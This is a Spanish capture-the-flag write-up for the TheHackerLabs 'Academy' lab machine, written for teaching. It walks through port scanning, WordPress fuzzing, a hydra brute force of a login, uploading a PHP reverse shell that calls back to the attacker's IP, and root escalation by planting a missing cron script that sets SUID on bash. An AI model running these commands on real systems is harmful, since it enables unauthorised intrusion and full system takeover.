---
title: "Academy - TheHackerLabs"
date: 2025-02-27
draft: false
slug: "THL-writeup-academy"
excerpt: "Esta fue una máquina sencilla. Después de analizar el escaneo y de revisar que la página web solamente muestra la página por defecto de Apache2, decidimos aplicar Fuzzing, con lo que encontramos un directorio de WordPress. Revisando este directorio, solo logramos identificar un dominio que guardamos en el archivo /etc/hosts. Aplicandole Fuzzing a este directorio, ubicamos el login de WordPress, pero nada más. Utilizando wpscan y el módulo wordpress_scanner de Metasploit, identificamos un usuario, al que le aplicamos Fuerza Bruta con hydra y con wpscan, resultando en un exito con ambas herramientas. Entrando al login de WordPress, vemos que podemos subir archivos gracias a un plugin. Nos aprovechamos de esto para subir una Reverse Shell y ganamos acceso a la máquina. Dentro de la máquina, revisamos con pspy las tareas CRON activas, descubriendo el uso de un script inexistente que aprovecharemos para suplantarlo y cambiarle los permisos de la Bash para escalar privilegios."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "WordPress", "PHP", "Web Enumeration", "Fuzzing", "WordPress Enumeration", "Brute Force Attack", "Abusing Plugin File Upload", "System Recognition (Linux)", "Abusing CRON Jobs", "Privesc - Abusing CRON Jobs", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "wfuzz"
  - "gobuster"
  - "wappalizer"
  - "wpscan"
  - "Metasploit Framework (msfconsole)"
  - "Módulo: auxiliary/scanner/http/wordpress_scanner"
  - "hydra"
  - "nc"
  - "php-reverse-shell (pentestmonkey)"
  - "wget"
  - "pspy64"
  - "chmod"
  - "bash"
links:
  - "https://github.com/pentestmonkey/php-reverse-shell"
  - "https://github.com/DominicBreuker/pspy"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-academy/academy.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.130
PING 192.168.1.130 (192.168.1.130) 56(84) bytes of data.
64 bytes from 192.168.1.130: icmp_seq=1 ttl=64 time=1.97 ms
64 bytes from 192.168.1.130: icmp_seq=2 ttl=64 time=0.799 ms
64 bytes from 192.168.1.130: icmp_seq=3 ttl=64 time=0.960 ms
64 bytes from 192.168.1.130: icmp_seq=4 ttl=64 time=0.884 ms

--- 192.168.1.130 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3002ms
rtt min/avg/max/mdev = 0.799/1.154/1.974/0.476 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.130 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-27 13:19 CST
Initiating ARP Ping Scan at 13:19
Scanning 192.168.1.130 [1 port]
Completed ARP Ping Scan at 13:19, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:19
Scanning 192.168.1.130 [65535 ports]
Discovered open port 22/tcp on 192.168.1.130
Discovered open port 80/tcp on 192.168.1.130
Completed SYN Stealth Scan at 13:20, 37.68s elapsed (65535 total ports)
Nmap scan report for 192.168.1.130
Host is up, received arp-response (0.00077s latency).
Scanned at 2025-02-27 13:19:43 CST for 37s
Not shown: 53055 filtered tcp ports (no-response), 12478 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 37.92 seconds
           Raw packets sent: 124833 (5.493MB) | Rcvd: 12483 (499.324KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solamente veo 2 puertos abiertos. Parece que la intrusión será por la página web activa en el **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.1.130 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-27 13:20 CST
Nmap scan report for 192.168.1.130
Host is up (0.00085s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

| ssh-hostkey: 
|   256 cb:96:e2:96:ae:29:8d:89:da:c0:c6:86:d8:3a:57:12 (ECDSA)
|_  256 8d:8d:c4:c3:5e:ba:f1:2f:ff:1a:d1:97:ef:6a:2f:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))

|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.59 (Debian)
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.14 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Parece que la página web solo muestra la página por defecto de **Apache2**. Si entramos no encontraremos nada ni revisando el código fuente, así que vamos a aplicar **Fuzzing** directamente, para ver que podemos encontrar.

## Análisis de Vulnerabilidades {#Analisis}

### Fuzzing {#fuzz}

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,html-php-txt-sh-cgi http://192.168.1.130/FUZZ.FUZ2Z
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.130/FUZZ.FUZ2Z
Total requests: 1102725

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000001:   200        368 L    933 W      10701 Ch    "index - html"                                                                                                               
000226126:   403        9 L      28 W       279 Ch      "html"                                                                                                                       
000226127:   403        9 L      28 W       279 Ch      "php"                                                                                                                        

Total time: 2166.130
Processed Requests: 1102725
Filtered Requests: 1102722
Requests/sec.: 509.0759
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-z*       | Para indicar una busqueda de archivos específicos. |

Ahora probemos con **gobuster**:

```bash
gobuster dir -u http://192.168.1.130/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php,cgi,sh,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.130/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              cgi,sh,html,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/wordpress            (Status: 301) [Size: 320] [--> http://192.168.1.130/wordpress/]
/.html                (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*       | Para indicar las extensiones de archivos especificas a buscar. |

Parece que existe un directorio llamado **wordpress**.

Vamos a verlo.

### Analizando Directorio wordpress {#wordpress}

Entremos a ese directorio:

<p align="center">
<img src="/assets/images/THL-writeup-academy/Captura1.png">
</p>

Ya podemos ver una página.

Veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-academy/Captura2.png">
</p>

Bien, tenemos bastante información como la versión de **WordPress** que está utilizando y que están utilizando **MySQL**.

En la página, podemos encontrar un botón que nos deja ver lo que parece ser una página de prueba, pero no la podemos ver:

<p align="center">
<img src="/assets/images/THL-writeup-academy/Captura3.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-academy/Captura4.png">
</p>

Parece que nos redirige a un dominio.

Vamos a registrarlo en el `/etc/hosts` y luego recargamos la página web:

<p align="center">
<img src="/assets/images/THL-writeup-academy/Captura5.png">
</p>

Excelente, ya se puede ver mejor y esto nos indica que se está aplicando **Virtual Hosting**.

De momento, no veo nada más, así que vamos a aplicar **Fuzzing** a este directorio para ver que podemos encontrar.

### Aplicando Fuzzing a Directorio wordpress {#fuzz2}

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,html-php-txt http://192.168.1.130/wordpress/FUZZ.FUZ2Z
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.130/wordpress/FUZZ.FUZ2Z
Total requests: 661635

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000001382:   200        108 L    428 W      6574 Ch     "wp-login - php"                                                                                                             
000001995:   200        384 L    3177 W     19915 Ch    "license - txt"                                                                                                              
000005146:   200        97 L     833 W      7401 Ch     "readme - html"                                                                                                              
000051104:   405        0 L      6 W        42 Ch       "xmlrpc - php"                                                                                                               
000000002:   301        0 L      0 W        0 Ch        "index - php"                                                                                                                
000135676:   403        9 L      28 W       279 Ch      "html"                                                                                                                       
000135677:   403        9 L      28 W       279 Ch      "php"                                                                                                                        
000138035:   302        0 L      0 W        0 Ch        "wp-signup - php"                                                                                                            

Total time: 706.5327
Processed Requests: 661635
Filtered Requests: 661627
Requests/sec.: 936.4534
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-z*       | Para indicar una busqueda de archivos específicos. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.1.130/wordpress/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.130/wordpress/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 331] [--> http://192.168.1.130/wordpress/wp-content/]
/index.php            (Status: 301) [Size: 0] [--> http://192.168.1.130/wordpress/]
/wp-login.php         (Status: 200) [Size: 6583]
/license.txt          (Status: 200) [Size: 19915]
/wp-includes          (Status: 301) [Size: 332] [--> http://192.168.1.130/wordpress/wp-includes/]
/readme.html          (Status: 200) [Size: 7401]
/wp-admin             (Status: 301) [Size: 329] [--> http://192.168.1.130/wordpress/wp-admin/]
/xmlrpc.php           (Status: 405) [Size: 42]
/.html                (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://academy.thl/wordpress/wp-login.php?action=register]
Progress: 882180 / 882184 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*       | Para indicar las extensiones de archivos especificas a buscar. |

Podemos ver varios archivos y directorios, pero el que nos interesa es el login de **WordPress** que está en el archivo `wp-login.php`.

<p align="center">
<img src="/assets/images/THL-writeup-academy/Captura6.png">
</p>

Es lo único interesante que pudimos encontrar.

Toca buscar si tiene plugins vulnerables.

### Buscando Plugins Vulnerables con wpscan y con Módulo wordpress_scanner de Metasploit {#pluginsScan}

Vamos a buscar plugins vulnerables con **wpscan**:
```bash
wpscan --url http://192.168.1.130/wordpress/ --enumerate u,vp --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.1.130/wordpress/ [192.168.1.130]
[+] Started: Thu Feb 27 14:29:22 2025

Interesting Finding(s):

[+] Headers

 | Interesting Entry: Server: Apache/2.4.59 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.1.130/wordpress/xmlrpc.php

 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
...
...
[+] Upload directory has listing enabled: http://192.168.1.130/wordpress/wp-content/uploads/

 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
...
...
...
[+] Enumerating Vulnerable Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:00:09 <============================================================================================================> (7343 / 7343) 100.00% Time: 00:00:09
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] dylan

 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Feb 27 14:29:35 2025
[+] Requests Done: 7356
[+] Cached Requests: 44
[+] Data Sent: 2.137 MB
[+] Data Received: 1016.545 KB
[+] Memory used: 228.176 MB
[+] Elapsed time: 00:00:12
```

| Parámetros | Descripción |
|---|---|
| *--url*    | Para indicar la URL a escanear. |
| *--enumerate* | Indicando que aplique enumeración, puede ser de usuarios (`u`), de plugins vulnerables (`vp`), etc. |
| *--plugins-detection* | Para indicar un modo de detección de plugins, se puede elegir entre `passive` (pasivo), `mixed` (mixto) y `agressive` (agresivo). |

Parece que no encontró ningún plugin, pero sí encontró a un usuario llamado **dylan**.

Ahora probemos con el módulo `auxiliary/scanner/http/wordpress_scanner` de **Metasploit**:

Usemos y configuremos el módulo:
```bash
msfconsole -q
msf6 > use auxiliary/scanner/http/wordpress_scanner
msf6 auxiliary(scanner/http/wordpress_scanner) > set RHOSTS 192.168.1.130
RHOSTS => 192.168.1.130
msf6 auxiliary(scanner/http/wordpress_scanner) > set TARGETURI /wordpress/index.php
TARGETURI => /wordpress/index.php
```

Ejecutemos el módulo:
```bash
msf6 auxiliary(scanner/http/wordpress_scanner) > exploit
[*] Trying 192.168.1.130
[+] 192.168.1.130 - Detected Wordpress 6.5.3
[*] 192.168.1.130 - Enumerating Themes
[*] 192.168.1.130 - Progress  0/3 (0.0%)
[*] 192.168.1.130 - Finished scanning themes
[*] 192.168.1.130 - Enumerating plugins
[*] 192.168.1.130 - Progress   0/70 (0.0%)
[*] 192.168.1.130 - Finished scanning plugins
[*] 192.168.1.130 - Searching Users
[+] 192.168.1.130 - Detected user: dylan with username: dylan
[*] 192.168.1.130 - Finished scanning users
[*] 192.168.1.130 - Finished all scans
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Parece que tampoco encontró algún plugin vulnerable, pero sí encontró el mismo usuario que ya habíamos encontrado antes.

Lo que se me ocurre es aplicar fuerza bruta a ese usuario que encontramos.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Fuerza Bruta a login de WordPress y Aplicando Fuerza Bruta con wpscan {#FBruta}

Primero, vamos a aplicar fuerza bruta al login de **WordPress**, utilizando la herramienta **hydra**.

Debemos indicarle la ruta del login y los parámetros donde se debe agregar el usuario y contraseña, además de que debemos poner una redirección para el caso que sea exitoso:
```bash
hydra -l dylan -P /usr/share/wordlists/rockyou.txt 192.168.1.130 http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302'
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-27 14:46:58
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://192.168.1.130:80/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302
[80][http-post-form] host: 192.168.1.130   login: dylan   password: ******
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-27 14:47:11
```
Muy bien, tenemos la contraseña.

Antes de probarla, vamos a utilizar **wpscan** para que aplique fuerza bruta y encuentre la contraseña del **usuario dylan**.
```bash
wpscan --url http://192.168.1.130/wordpress/ -U dylan -P /usr/share/wordlists/rockyou.txt --no-banner --disable-tls-checks
[+] URL: http://192.168.1.130/wordpress/ [192.168.1.130]
[+] Started: Thu Feb 27 14:58:44 2025
...
...
[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - dylan / ******
Trying dylan / soccer Time: 00:00:00 <                             > (30 / 14344422)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:

 | Username: dylan, Password: ******

[+] Finished: Thu Feb 27 14:58:48 2025
[+] Requests Done: 36
[+] Cached Requests: 3
[+] Data Sent: 13.211 KB
[+] Data Received: 353.66 KB
[+] Memory used: 259.406 MB
[+] Elapsed time: 00:00:04
```

| Parámetros | Descripción |
|---|---|
| *-U*       | Para indicar una lista o el nombre de un usuario. |
| *-P*	     | Para indicar una lista de contraseñas a probar. |
| *--no-banner* | Para quitar el banner de wpscan. |
| *--disable-tls-checks* | Deshabilita la verificación de **SSL/TLS**. |

Excelente, también pudimos obtener la contraseña con **wpscan**.

Ahora sí, vamos a probar esta contraseña en el login:

<p align="center">
<img src="/assets/images/THL-writeup-academy/Captura7.png">
</p>

Funciono, estamos dentro.

### Subiendo Reverse Shell a Plugin de WordPress para Ganar Acceso a la Máquina {#revShell}

Si revisamos la sección de plugins, podemos encontrar uno interesante:

<p align="center">
<img src="/assets/images/THL-writeup-academy/Captura8.png">
</p>

Al parecer, este plugin nos permite subir archivos y directorios al **WordPress**:

<p align="center">
<img src="/assets/images/THL-writeup-academy/Captura9.png">
</p>

Vamos a subir una **Reverse Shell de PHP**, que para más rapidez y comodidad, usaremos la de **PentestMonkey**:
* <a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank">Repositorio de pentestmonkey: php-reverse-shell</a>

La descargamos con **wget**:
```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
--2025-02-27 16:23:22--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com) ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 5491 (5.4K) [text/plain]
Grabando a: «php-reverse-shell.php»

php-reverse-shell.php      100%[====================>]   5.36K  --.-KB/s    en 0.005s  

2025-02-27 16:23:22 (1.11 MB/s) - «php-reverse-shell.php» guardado [5491/5491]
```

Y la modificamos agregando nuestra IP y un puerto random:
```bash
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = 'Tu_IP';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

Ahora vamos a cargarla al plugin:

<p align="center">
<img src="/assets/images/THL-writeup-academy/Captura10.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-academy/Captura11.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-academy/Captura12.png">
</p>

Ya está cargada.

Abre una **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

Y visita la **Reverse Shell** que cargamos, sería la ruta `/wordpress/php-reverse-shell.php`.

Observa la **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.130] 49052
Linux debian 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64 GNU/Linux
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
Bien, obtén una sesión interactiva porque será necesaria para la **Post Explotación**.

## Post Explotación {#Post}

### Enumeración de Máquina {#enumLin}

Si nos vamos al directorio `/home`, encontraremos el directorio del **usuario debian**, pero no podremos entrar:
```bash
www-data@debian:/$ cd /home/
www-data@debian:/home$ ls
debian
www-data@debian:/home$ cd debian/
bash: cd: debian/: Permission denied
```

No podemos ver qué privilegios tiene nuestro usuario, porque no tenemos la contraseña.

Investigando un poco, encontramos el siguiente script en el directorio `/opt`:
```bash
www-data@debian:/home$ ls /opt
backup.py
```

Veamos su contenido de este script:

```bash
www-data@debian:/home$ cat /opt/backup.py 
import paramiko

def conectar_ssh(hostname, username, password):
    try:
        cliente_ssh = paramiko.SSHClient()

        cliente_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        cliente_ssh.connect(hostname, username=username, password=password)

        print("Conexión SSH exitosa")

        cliente_ssh.close()
    except SSHException as e:
        print("Error al establecer la conexión SSH:", e)

hostname = "192.168.0.20"
username = "dylan"
password = "dylan123"

conectar_ssh(hostname, username, password)
```
Parece un script que nos conecta a un **servicio SSH** con el **usuario dylan** y su contraseña. Pero, este script no va a funcionar porque la máquina no encuentra el **módulo de paramiko**.

Podríamos aplicar **Python Library Hijacking**, pero como no podemos ejecutar este script con **permisos de sudo**, no tendría sentido intentarlo.

Veamos si podemos encontrar alguna tarea en segundo plano, ya que busque algo con **linpeas.sh**, pero no encontré algo útil que nos ayude a escalar privilegios.

### Enumeración de Tareas CRON y Aprovechandonos de Estas para Escalar Privilegios {#pspy}

Aquí puede obtener **pspy64**:
* <a href="https://github.com/DominicBreuker/pspy" target="_blank">Repositorio de DominicBreuker: pspy</a>

Vamos a descargar **pspy64** en la máquina víctima con **wget**:
```bash
www-data@debian:/opt$ 
www-data@debian:/opt$ wget http://Tu_IP/pspy64
--2025-02-27 17:15:11--  http://Tu_IP/pspy64
Connecting to Tu_IP:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: 'pspy64'
.
pspy64           100%[=========================>]   2.96M  --.-KB/s    in 0.04s
.
2025-02-27 17:15:11 (80.3 MB/s) - 'pspy64' saved [3104768/3104768]
```

Ejecútalo y espera unos minutos para ver si aparece algo:
```bash
2025/02/27 17:17:02 CMD: UID=0     PID=2      | 
2025/02/27 17:17:02 CMD: UID=0     PID=1      | init [2]   
2025/02/27 17:18:01 CMD: UID=0     PID=3816   | /usr/sbin/CRON 
2025/02/27 17:18:01 CMD: UID=0     PID=3817   | /usr/sbin/CRON 
2025/02/27 17:18:01 CMD: UID=0     PID=3819   | /bin/sh -c /opt/backup.sh 
2025/02/27 17:19:01 CMD: UID=0     PID=3820   | /usr/sbin/CRON 
2025/02/27 17:19:01 CMD: UID=0     PID=3821   | /usr/sbin/CRON 
2025/02/27 17:19:01 CMD: UID=0     PID=3822   | /bin/sh -c /opt/backup.sh
```
Bien, parece que cada minuto, se intenta ejecutar un script llamado **backup.sh** dentro del directorio `/opt`, pero lo extraño es que ese script no existe dentro del directorio `/opt`.

Entonces, podemos crear este script con el comando que nosotros queramos, por ejemplo, ponerle **permisos SUID a la Bash**.

Podemos revisar los **permisos de la Bash**, así comprobamos que aún no la podemos usar:
```bash
www-data@debian:/opt$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1265648 Apr 23  2023 /bin/bash
```

Creamos el script en el directorio `/opt` y le damos permisos de ejecución:
```bash
www-data@debian:/opt$ cat backup.sh 
#!/bin/bash
chmod u+s /bin/bash
www-data@debian:/opt$ chmod +x backup.sh
```

Ahora espera 1 minuto y vuelve a revisar los **permisos de la Bash**:
```bash
www-data@debian:/opt$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 Apr 23  2023 /bin/bash
```
Funciono.

Ahora podemos usar la **Bash con privilegios**:
```bash
www-data@debian:/opt$ bash -p
bash-5.2# whoami
root
```

Ya solo debemos buscar las flags:
```bash
bash-5.2# cd /home/debian/
bash-5.2# ls
user.txt
bash-5.2# cat user.txt 
...
bash-5.2# cd /root
bash-5.2# ls
root.txt
bash-5.2# cat root.txt
...
```
Y con esto completamos la máquina.
